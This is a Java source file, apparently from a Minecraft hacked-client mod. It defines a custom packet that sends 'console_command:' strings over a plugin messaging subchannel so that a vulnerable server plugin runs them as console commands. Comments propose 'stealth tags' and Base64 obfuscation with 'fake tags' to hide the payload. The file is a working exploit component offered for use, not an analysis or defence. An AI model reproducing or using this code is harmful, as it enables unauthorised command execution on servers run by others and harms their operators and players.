package io.github.spigotrce.paradiseclientfabric.packet;

import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.util.Identifier;

import java.nio.charset.StandardCharsets;

public record ECBPayloadPacket(String command) implements CustomPayload {
    public static final PacketCodec<PacketByteBuf, ECBPayloadPacket> CODEC =
            CustomPayload.codecOf(ECBPayloadPacket::write, ECBPayloadPacket::new);

    public static final Id<ECBPayloadPacket> ID = new Id<>(Identifier.of("ecb", "channel"));

    public ECBPayloadPacket(PacketByteBuf buf) {
        this(buf.readString());
    }

    public ECBPayloadPacket(String command) {
        this.command = sanitize(command);
    }

    private static String sanitize(String cmd) {
        return cmd == null ? "" : cmd.trim().replace("\n", "").replace("\r", "");
    }

    public void write(PacketByteBuf buf) {
        ByteArrayDataOutput out = ByteStreams.newDataOutput();

        // Subchannel naming may be plugin-specific
        out.writeUTF("ActionsSubChannel");

        // Optional: Add stealth tags or execution identifiers
        String payload = "console_command: " + command;

        // Optional: Obfuscate payload or wrap with fake tags
        // payload = Base64.getEncoder().encodeToString(payload.getBytes(StandardCharsets.UTF_8));
        // out.writeUTF("obfuscated:" + payload);

        out.writeUTF(payload);

        buf.writeBytes(out.toByteArray());
    }

    @Override
    public Id<ECBPayloadPacket> getId() {
        return ID;
    }
}
